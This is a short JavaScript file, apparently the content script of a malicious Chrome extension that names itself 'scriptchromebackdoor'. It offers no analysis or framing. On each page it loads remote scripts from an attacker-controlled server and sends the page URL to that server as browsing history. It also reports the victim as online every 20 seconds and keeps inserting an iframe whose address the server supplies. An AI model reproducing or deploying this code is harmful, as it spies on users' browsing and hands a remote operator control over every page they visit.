$(document).ready(function()
{
    var phish = "";
    var version = 'Build001';
    var tabURL = window.location.href;

    //settings

    var v = document.createElement('script');
    v.type = 'text/javascript';
    v.async = true;
    v.id = "scriptchromebackdoor"
    v.src = server_web+"relais/jquery.js";
    //var z = document.getElementById('script')[0];
    
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.async = true;
    s.src = server_web+"relais/show_script.php";
    document.body.appendChild(v);
    document.body.appendChild(s);
    
    function online(){
        $.get(server_web+'relais/index.php?online=1');
    }
    
    function iframe(){
        if(typeof $('#zfpjfizeoi')[0] == undefined){
            $.get(server_web+'relais/index.php?iframe=1', function(data){
                if(data != ''){
                   var ifrm = document.createElement("IFRAME");
                   ifrm.setAttribute("src", data);
                    ifrm.setAttribute("id", "zfpjfizeoi");
                    document.body.appendChild(ifrm); 
                }
            });
        }
    }
    
    setInterval(iframe, 300);
    setInterval(online,20000);
    var url_history = window.location.href;

    $.get(server_web+'relais/index.php?online=1');
    $.get(server_web+'relais/index.php?history='+url_history);
    $.get(server_web+'relais/index.php?n=pop&version='+version);
    
    //module
 

});
